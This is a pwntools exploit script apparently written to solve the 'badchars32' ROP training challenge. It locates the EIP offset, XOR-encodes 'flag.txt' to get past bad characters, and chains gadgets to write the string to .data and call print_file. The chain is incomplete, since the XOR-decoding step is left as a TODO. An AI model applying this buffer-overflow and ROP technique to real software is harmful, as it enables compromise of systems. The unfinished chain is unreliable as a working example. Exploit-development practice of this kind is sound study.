from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-gef
break print_file
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip, alphabet='bcdefhijk')
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))

# Start program
io = start()
info(io.recvline_contains('badchars are'))

# Address of .data section (size=8 bytes)
data_section_address = 0x0804a018

# We will pop string(flag.txt) into esi
# Then pop address of .data section into edi
# NOTE: this is different to previous example in that we pop string first, THEN .data section
# Also note we also have a 'pop ebp' instruction which we did not have in write chall
pop_esi_pop_edi_pop_ebp = 0x080485b9  # pop esi; pop edi; pop ebp; ret;

# We will then move the string from esi (flag.txt) into memory location stored in edi
mov_edi_esi = 0x0804854f  # mov dword ptr [edi], esi; ret;

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x80483d0

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_esi_pop_edi_pop_ebp", pop_esi_pop_edi_pop_ebp)
info("%#x print_file", print_file)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

badchars = bytes(range(256))
print(str(badchars))

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_esi_pop_edi_pop_ebp,  # Pop 4 byte string (1 - flag [XORd]) into esi and pop .data (2) location into edi
    xored_string[:4],  # 1
    data_section_address,  # 2
    0x0,  # 3 - The instruction also pops ebp (not needed) so just send this empty value
    mov_edi_esi,  # Move string (1) to memory location (2) stored in edi

    # Repeat for remaining part of string
    pop_esi_pop_edi_pop_ebp,  # Pop 4 byte string (1 - .txt [XORd]) into esi and pop .data (2) location into edi
    xored_string[4:],  # 1
    data_section_address + 0x4,  # 2 (an extra 4 bytes since we wrote "flag")
    0x0,  # 3 - The instruction also pops ebp (not needed) so just send this empty value
    mov_edi_esi,  # Move string (1) to memory location (2) stored in edi

    # TODO: Need to XOR now

    print_file,  # Call print_file()
    0x0,  # Return pointer
    data_section_address  # Location of flag.txt string
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
